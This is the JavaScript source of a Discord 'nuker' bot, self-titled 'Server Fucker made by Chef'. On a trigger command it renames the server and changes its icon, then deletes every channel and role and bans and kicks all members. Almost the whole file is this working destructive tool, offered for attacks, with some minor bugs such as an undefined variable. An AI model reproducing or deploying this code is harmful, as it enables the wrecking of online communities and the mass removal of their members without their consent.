const ZeroDayz = require('zerodayz.js')
const Discord = require("discord.js")
const bot = new ZeroDayz.Client()
const { prefix } = require("./config.json")
const { token } = require("./config.json")
const { icon } = require("./config.json")
const { nukecmd } = require("./config.json")
const { servername } = require("./config.json")
const prompt = require('prompt-sync')();

process.title = "Server Fucker made by Chef"
console.clear()



const logo = (`
  ██████╗  █████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
  ██║  ██║███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
  ██║  ██║██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
  ██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
console.log(logo)
console.log(`
  [1] = Go in Attack mode
`)

console.log("")
const action = prompt(" $  ")

if(action === "1")  {
        bot.on("ready", function() { 
            console.clear()
            console.log(`
  ██████╗  █████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
  ██║  ██║███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
  ██║  ██║██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
  ██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                listening for ${prefix}${nukecmd} ║ User ${bot.user.username}
                
  `)
            
        
        
        
        })
        bot.on("message", message => {
                   
                   
            if(message.content == `${prefix}${nukecmd}`) {
                
                    
                    message.guild.setName(`FUCKING YOUR SERVER...`).then(() => {
                        console.log(`  -# Changed sever name`)
                    }).catch(() => console.error)

                    //Changes Server Name
                    message.guild.setName(`${servername}`).then(() => {
                        console.log(`  -# Changed sever name`)
                    }).catch(() => console.error)
                    
                    //Changes Server ICON
                    message.guild.setIcon(`${icon}`).then(() => {
                        console.log(`  -# Changed sever icon`)
                    }).catch(() => console.error)
                 
                    //Deletes All Channels
                    message.guild.channels.map(channel => {
                        channel.delete().then(() => {
                        console.log(`  -# Channel Deleted: #${channel.name}`)
                        }).catch(() => console.error)
                    })
                 
                    //Deletes ALl Roles
                    message.guild.roles.map(role => {
                     role.delete().then(() => {
                        console.log(`  -# Role Deleted: @${role.name}`)
                     }).catch(() => console.error)
                     
                     //Bans Members
                     message.guild.members.map(member => {
                         member.ban().then(() => {
                            console.log(`  -# ${member.user.tag} was banned from ${msg.guild.name}`)
                         }).catch(() => console.error)
                     })
                 
                     //Kicks Members
                     message.guild.members.map(member => {
                         member.kick().then(() => {
                         console.log(`  -# ${member.user.tag} was kicked from ${msg.guild.name}`)
                         }).catch(() => console.error)
                     })
                 })
                 
                    
                }
               
                
            
                    
                }
            
      
                )
        
                bot.login(token); 
    }
    
    
        
        
         
    
    
       
        
    



